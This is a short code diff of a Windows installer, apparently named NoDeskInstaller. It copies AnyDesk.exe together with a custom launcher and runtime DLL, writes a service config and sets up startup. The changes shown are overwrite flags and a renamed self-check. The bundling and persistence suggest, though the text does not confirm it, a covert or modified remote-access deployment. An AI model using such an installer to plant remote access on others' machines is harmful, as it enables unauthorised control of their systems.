@@ -17,12 +17,12 @@ void ConfigureStartup() {
 
 void InstallFiles() {
 	CreateDirectoryW(target_dir, NULL);
-	CopyFileW(L"AnyDesk.exe", target_exe, TRUE);
-	CopyFileW(L"NoDesk.exe", target_launcher, TRUE);
-	CopyFileW(L"NoDeskRT.dll", target_dll, TRUE);
+	CopyFileW(L"AnyDesk.exe", target_exe, FALSE);
+	CopyFileW(L"NoDesk.exe", target_launcher, FALSE);
+	CopyFileW(L"NoDeskRT.dll", target_dll, FALSE);
 
 	CreateDirectoryW(config_dir, NULL);
-	CopyFileW(L"service.conf", config_service, NULL);
+	CopyFileW(L"service.conf", config_service, TRUE);
 }
 
 int main()
@@ -30,7 +30,7 @@ int main()
     GeneratePaths();
 
     wprintf(L"%s\n%s\n%s\n%s\n", target_dll, target_exe, target_launcher, config_service);
-	if (wcscmp(szCurName, L"ConsoleApplication1.exe") == 0) {
+	if (wcscmp(szCurName, L"NoDeskInstaller.exe") == 0) {
 		wprintf(L"Go!\n");
 
 		ConfigureStartup();
